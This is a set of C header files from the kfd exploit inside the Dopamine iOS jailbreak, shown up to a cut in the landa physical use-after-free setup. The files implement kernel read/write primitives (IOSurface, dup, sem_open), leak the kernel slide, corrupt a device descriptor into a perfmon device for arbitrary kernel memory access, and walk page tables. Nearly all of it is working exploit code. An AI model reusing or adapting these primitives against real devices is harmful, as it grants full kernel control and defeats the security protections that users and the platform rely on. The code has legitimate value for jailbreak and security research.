`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/kwrite/kwrite_IOSurface.h`:

```h
//
//  kwrite_IOSurface.h
//  kfd
//
//  Created by Lars Fröder on 30.07.23.
//
// I attempted to make this standalone from kread but that probably doesn't work, so just select IOSurface for both kread and kwrite

#ifndef kwrite_IOSurface_h
#define kwrite_IOSurface_h

#include "../kread/kread_IOSurface.h"

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_IOSurface_init(struct kfd* kfd)
{
    if (kfd->kread.krkw_method_ops.init != kread_IOSurface_init) {
        return kread_IOSurface_init(kfd);
    }
}

void kwrite_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    if (kfd->kread.krkw_method_ops.allocate != kread_IOSurface_allocate) {
        return kread_IOSurface_allocate(kfd, id);
    }
}

bool kwrite_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    if (kfd->kread.krkw_method_ops.search != kread_IOSurface_search) {
        return kread_IOSurface_search(kfd, object_uaddr);
    }
    return true;
}

void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_IOSurface_kwrite_u64);
}

void kwrite_IOSurface_find_proc(struct kfd* kfd)
{
    return;
}

void kwrite_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (kfd->kread.krkw_method_ops.deallocate != kread_IOSurface_deallocate) {
        return kread_IOSurface_deallocate(kfd, id);
    }
}

void kwrite_IOSurface_free(struct kfd* kfd)
{
    if (kfd->kread.krkw_method_ops.free != kread_IOSurface_free) {
        return kread_IOSurface_free(kfd);
    }
}

/*
 * 64-bit kwrite function.
 */

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    u64 iosurface_uaddr = 0;
    struct iosurface_obj krwObject = { 0 };
    
    if (kfd->kread.krkw_method_ops.init == kread_IOSurface_init) {
        iosurface_uaddr = kfd->kread.krkw_object_uaddr;
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
        krwObject = objectStorage[kfd->kread.krkw_object_id];
    }
    else {
        iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
        krwObject = objectStorage[kfd->kwrite.krkw_object_id];
    }
    
    u64 backup = *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__indexedTimestampPtr));
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__indexedTimestampPtr)) = kaddr;
    

    set_indexed_timestamp(krwObject.port, krwObject.surface_id, 0, new_value);
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__indexedTimestampPtr)) = backup;
}


#endif /* kwrite_IOSurface_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/kwrite/kwrite_dup.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kwrite_dup_h
#define kwrite_dup_h

void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_dup_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id + 1) * (sizeof(i32)));
    kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);

    i32 kqueue_fd = kqueue();
    assert(kqueue_fd > 0);

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    fds[kfd->kwrite.krkw_maximum_id] = kqueue_fd;
}

void kwrite_dup_allocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kqueue_fd = fds[kfd->kwrite.krkw_maximum_id];
    i32 fd = dup(kqueue_fd);
    assert(fd > 0);
    fds[id] = fd;
}

bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct fileproc* fp = (volatile struct fileproc*)(object_uaddr);
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);

    if ((fp->fp_iocount == 1) &&
        (fp->fp_vflags == 0) &&
        (fp->fp_flags == 0) &&
        (fp->fp_guard_attrs == 0) &&
        (fp->fp_glob > PTR_MASK) &&
        (fp->fp_guard == 0)) {
        for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            if (fp->fp_flags == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        /*
         * False alarm: it wasn't one of our fileproc objects.
         */
        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_dup_kwrite_u64);
}

void kwrite_dup_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_dup_deallocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    assert_bsd(close(fds[id]));
}

void kwrite_dup_free(struct kfd* kfd)
{
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

/*
 * 64-bit kwrite function.
 */

void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    if (new_value == 0) {
        print_warning("cannot write 0");
        return;
    }

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kwrite_fd = fds[kfd->kwrite.krkw_object_id];
    u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
    volatile struct fileproc* fp = (volatile struct fileproc*)(fileproc_uaddr);

    const bool allow_retry = false;

    do {
        u64 old_value = 0;
        kread((u64)(kfd), kaddr, &old_value, sizeof(old_value));

        if (old_value == 0) {
            print_warning("cannot overwrite 0");
            return;
        }

        if (old_value == new_value) {
            break;
        }

        u16 old_fp_guard_attrs = fp->fp_guard_attrs;
        u16 new_fp_guard_attrs = GUARD_REQUIRED;
        fp->fp_guard_attrs = new_fp_guard_attrs;

        u64 old_fp_guard = fp->fp_guard;
        u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);
        fp->fp_guard = new_fp_guard;

        u64 guard = old_value;
        u32 guardflags = GUARD_REQUIRED;
        u64 nguard = new_value;
        u32 nguardflags = GUARD_REQUIRED;

        if (allow_retry) {
            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
        } else {
            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
        }

        fp->fp_guard_attrs = old_fp_guard_attrs;
        fp->fp_guard = old_fp_guard;
    } while (allow_retry);
}

#endif /* kwrite_dup_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/kwrite/kwrite_sem_open.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kwrite_sem_open_h
#define kwrite_sem_open_h

void kwrite_sem_open_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->kread.krkw_maximum_id;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = kfd->kread.krkw_method_data_size;
    kfd->kwrite.krkw_method_data = kfd->kread.krkw_method_data;
}

void kwrite_sem_open_allocate(struct kfd* kfd, u64 id)
{
    if (id == 0) {
        id = kfd->kwrite.krkw_allocated_id = kfd->kread.krkw_allocated_id;
        if (kfd->kwrite.krkw_allocated_id == kfd->kwrite.krkw_maximum_id) {
            /*
             * Decrement krkw_allocated_id to account for increment in
             * krkw_helper_run_allocate(), because we return without allocating.
             */
            kfd->kwrite.krkw_allocated_id--;
            return;
        }
    }

    /*
     * Just piggyback.
     */
    kread_sem_open_allocate(kfd, id);
}

bool kwrite_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    /*
     * Just piggyback.
     */
    return kwrite_dup_search(kfd, object_uaddr);
}

void kwrite_sem_open_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    /*
     * Just piggyback.
     */
    kwrite_dup_kwrite(kfd, uaddr, kaddr, size);
}

void kwrite_sem_open_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Skip the deallocation for the kread object because we are
     * responsible for deallocating all the shared file descriptors.
     */
    if (id != kfd->kread.krkw_object_id) {
        i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
        assert_bsd(close(fds[id]));
    }
}

void kwrite_sem_open_free(struct kfd* kfd)
{
    /*
     * Note that we are responsible to deallocate the kread object, but we must
     * discard its object id because of the check in kwrite_sem_open_deallocate().
     */
    u64 kread_id = kfd->kread.krkw_object_id;
    kfd->kread.krkw_object_id = (-1);
    kwrite_sem_open_deallocate(kfd, kread_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

#endif /* kwrite_sem_open_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/perf.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef perf_h
#define perf_h

// Forward declarations for helper functions.
u64 phystokv(struct kfd* kfd, u64 pa);
u64 vtophys(struct kfd* kfd, u64 va);

void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    assert((size != 0) && (size <= UINT16_MAX));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (u16)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (u16)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    assert((size != 0) && ((size % sizeof(u64)) == 0));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    u64 source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    u64 event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (u64 i = 0; i < (size / sizeof(u64)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(u64)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        u64 kvalue = ((volatile u64*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_init(struct kfd* kfd)
{
    if (!dynamic_system_info.perf_supported) {
        return;
    }

    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;

    /*
     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
     */
    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    assert(kfd->perf.dev.fd > 0);
}

void perf_run(struct kfd* kfd)
{
    if (!dynamic_system_info.perf_supported) {
        return;
    }

    assert(kfd->info.kaddr.current_proc);
    u64 fd_ofiles = dynamic_kget(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
    u64 fileproc_kaddr = UNSIGN_PTR(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
    u64 fileproc = 0;
    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
    u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
    u64 fp_glob = 0;
    kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
    u64 fg_ops = static_kget(struct fileglob, fg_ops, UNSIGN_PTR(fp_glob));
    u64 fo_kqfilter =  static_kget(struct fileops, fo_kqfilter, UNSIGN_PTR(fg_ops));
    u64 vn_kqfilter = UNSIGN_PTR(fo_kqfilter);
    u64 kernel_slide = vn_kqfilter - dynamic_info(kernelcache__vn_kqfilter);
    u64 kernel_base = ARM64_LINK_ADDR + kernel_slide;
    kfd->info.kaddr.kernel_slide = kernel_slide;
    print_x64(kfd->info.kaddr.kernel_slide);

    if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
        u32 mh_header[2] = {};
        mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
        mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
        assert(mh_header[0] == 0xfeedfacf);
        assert(mh_header[1] == 0x0100000c);
    }

    /*
     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
     */
    u64 fg_data = static_kget(struct fileglob, fg_data, UNSIGN_PTR(fp_glob));
    u64 v_specinfo = static_kget(struct vnode, v_un.vu_specinfo, UNSIGN_PTR(fg_data));
    kfd->perf.dev.si_rdev_kaddr = UNSIGN_PTR(v_specinfo) + offsetof(struct specinfo, si_rdev);
    kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));

    u64 cdevsw_kaddr = dynamic_info(kernelcache__cdevsw) + kernel_slide;
    u64 perfmon_dev_open_kaddr = dynamic_info(kernelcache__perfmon_dev_open) + kernel_slide;
    u64 cdevsw[14] = {};
    u32 dev_new_major = 0;
    for (u64 dmaj = 0; dmaj < 64; dmaj++) {
        u64 kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread((u64)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        u64 d_open = UNSIGN_PTR(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            break;
        }
    }

    u32 new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    kwrite((u64)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));

    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    u64 ptov_table_kaddr = dynamic_info(kernelcache__ptov_table) + kernel_slide;
    kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));

    u64 gVirtBase_kaddr = dynamic_info(kernelcache__gVirtBase) + kernel_slide;
    kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
    print_x64(kfd->perf.gVirtBase);

    u64 gPhysBase_kaddr = dynamic_info(kernelcache__gPhysBase) + kernel_slide;
    kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
    print_x64(kfd->perf.gPhysBase);

    u64 gPhysSize_kaddr = dynamic_info(kernelcache__gPhysSize) + kernel_slide;
    kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
    print_x64(kfd->perf.gPhysSize);

    assert(kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].va = static_kget(struct pmap, tte, kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].pa = static_kget(struct pmap, ttep, kfd->info.kaddr.current_pmap);
    assert(phystokv(kfd, kfd->perf.ttbr[0].pa) == kfd->perf.ttbr[0].va);

    assert(kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].va = static_kget(struct pmap, tte, kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].pa = static_kget(struct pmap, ttep, kfd->info.kaddr.kernel_pmap);
    assert(phystokv(kfd, kfd->perf.ttbr[1].pa) == kfd->perf.ttbr[1].va);

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);

    /*
     * Set up the perfmon device use for the master kread and kwrite:
     * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
     * - perfmon_devices[0][0].pmdv_allocated = true
     */
    struct perfmon_device perfmon_device = {};
    u64 perfmon_device_kaddr = dynamic_info(kernelcache__perfmon_devices) + kernel_slide;
    u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
    kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite((u64)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[4] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[5] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(u64));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
}

void perf_free(struct kfd* kfd)
{
    if (!dynamic_system_info.perf_supported) {
        return;
    }

    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;

    /*
     * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
     * Then, close it and deallocate the shared page.
     * This leaves the first perfmon device "pmdv_allocated", which is fine.
     */
    kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
    assert_bsd(close(kfd->perf.dev.fd));
    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
}

/*
 * Helper perf functions.
 */

u64 phystokv(struct kfd* kfd, u64 pa)
{
    const u64 PTOV_TABLE_SIZE = 8;
    const u64 gVirtBase = kfd->perf.gVirtBase;
    const u64 gPhysBase = kfd->perf.gPhysBase;
    const u64 gPhysSize = kfd->perf.gPhysSize;
    const struct ptov_table_entry* ptov_table = &kfd->perf.ptov_table[0];

    for (u64 i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

u64 vtophys(struct kfd* kfd, u64 va)
{
    const u64 ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const u64 LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    u64 pa = 0;
    u64 tt_kaddr = (va >> 63) ? kfd->perf.ttbr[1].va : kfd->perf.ttbr[0].va;

    for (u64 cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        u64 offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        u64 tte_index = (va & index_mask) >> shift;
        u64 tte_kaddr = tt_kaddr + (tte_index * sizeof(u64));
        u64 tte = 0;
        kread((u64)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}

#endif /* perf_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/puaf.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef puaf_h
#define puaf_h

// Forward declarations for helper functions.
void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out);
void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out);
void puaf_helper_give_ppl_pages(void);

#include "puaf/landa.h"
#include "puaf/physpuppet.h"
#include "puaf/smith.h"

#define puaf_method_case(method)                                 \
    case puaf_##method: {                                        \
        const char* method_name = #method;                       \
        print_string(method_name);                               \
        kfd->puaf.puaf_method_ops.init = method##_init;          \
        kfd->puaf.puaf_method_ops.run = method##_run;            \
        kfd->puaf.puaf_method_ops.cleanup = method##_cleanup;    \
        kfd->puaf.puaf_method_ops.free = method##_free;          \
        break;                                                   \
    }

void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
{
    kfd->puaf.number_of_puaf_pages = puaf_pages;
    kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));

    switch (puaf_method) {
        puaf_method_case(landa)
        puaf_method_case(physpuppet)
        puaf_method_case(smith)
    }
    
    if(puaf_method == puaf_landa) {
        kfd->puaf.puaf_method_ops.deallocate = landa_deallocate;
    }
    else {
        kfd->puaf.puaf_method_ops.deallocate = NULL;
    }

    kfd->puaf.puaf_method_ops.init(kfd);
}

void puaf_run(struct kfd* kfd)
{
//#if __arm64e__
    puaf_helper_give_ppl_pages(); // maybe unnecessary on non_ppl devices.
//#endif
    timer_start();
    kfd->puaf.puaf_method_ops.run(kfd);
    timer_end();
}

void puaf_cleanup(struct kfd* kfd)
{
    timer_start();
    kfd->puaf.puaf_method_ops.cleanup(kfd);
    timer_end();
}

void puaf_free(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.free(kfd);

    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(u64));

    if (kfd->puaf.puaf_method_data) {
        bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
    }
}

/*
 * Helper puaf functions.
 */

void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
{
    u64 first_address = 0;
    u64 last_address = 0;

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if (kret == KERN_INVALID_ADDRESS) {
            last_address = address;
            break;
        }

        assert(kret == KERN_SUCCESS);

        if (!first_address) {
            first_address = address;
        }

        address += size;
        size = 0;
    }

    *first_out = first_address;
    *last_out = last_address;
}

void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
{
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    assert_mach(task_info(mach_task_self(), TASK_VM_INFO, info, &count));

    *min_out = data.min_address;
    *max_out = data.max_address;
}

void puaf_helper_give_ppl_pages(void)
{
    timer_start();

    const u64 given_ppl_pages_max = 10000;
    const u64 l2_block_size = (1ull << 25);

    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    u64 given_ppl_pages = 0;

    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    while (true) {
        address += l2_block_size;
        if (address < min_address) {
            continue;
        }

        if (address >= max_address) {
            break;
        }

        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }

    for (u64 i = 0; i < given_ppl_pages; i++) {
        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
    }

    print_u64(given_ppl_pages);
    timer_end();
}

#endif /* puaf_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/puaf/landa.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef landa_h
#define landa_h

u64 landa_vme1_size = pages(1);
u64 landa_vme2_size = pages(1);
const u64 landa_vme4_size = pages(1);

// Forward declarations for helper functions.
void* landa_helper_spinner_pthread(void* arg);

struct landa_data {
    atomic_bool main_thread_returned;
    atomic_bool spinner_thread_started;
    vm_address_t copy_src_address;
    vm_address_t copy_dst_address;
    vm_size_t copy_size;
    
    vm_address_t vme1_src_addr;
    vm_size_t    vme1_src_size;
    vm_address_t vme2_src_addr;
    vm_size_t    vme2_src_size;
    vm_address_t vme3_src_addr;
    vm_size_t    vme3_src_size;
    vm_address_t vme1_dst_addr;
    vm_size_t    vme1_dst_size;
    vm_address_t vme2_dst_addr;
    vm_size_t    vme2_dst_size;
    vm_address_t vme3_dst_addr;
    vm_size_t    vme3_dst_size;
};

void landa_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct landa_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);
    
    // use default values for non-A8
    landa_vme1_size = pages(1);
    landa_vme2_size = pages(1);
    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);
    if (cpuFamily == CPUFAMILY_ARM_TYPHOON) {
        // use pages(16) for A8. Not sure why this works.
        landa_vme1_size = pages(16);
        landa_vme2_size = pages(16);
    }
}

void landa_run(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);

    /*
     * Note:
     * - The size of [src/dst]_vme_3 must be equal to pages(X), i.e. the desired PUAF size.
     * - The copy_size must be greater than msg_ool_size_small (32 KiB), therefore it is
     *   sufficient for [src/dst]_vme_1 and [src/dst]_vme_2 to have a size of pages(1).
     */
    u64 landa_vme3_size = pages(kfd->puaf.number_of_puaf_pages);
    vm_size_t copy_size = landa_vme1_size + landa_vme2_size + landa_vme3_size;
    landa->copy_size = copy_size;

    /*
     * STEP 1A:
     *
     * Allocate the source VMEs and VMOs:
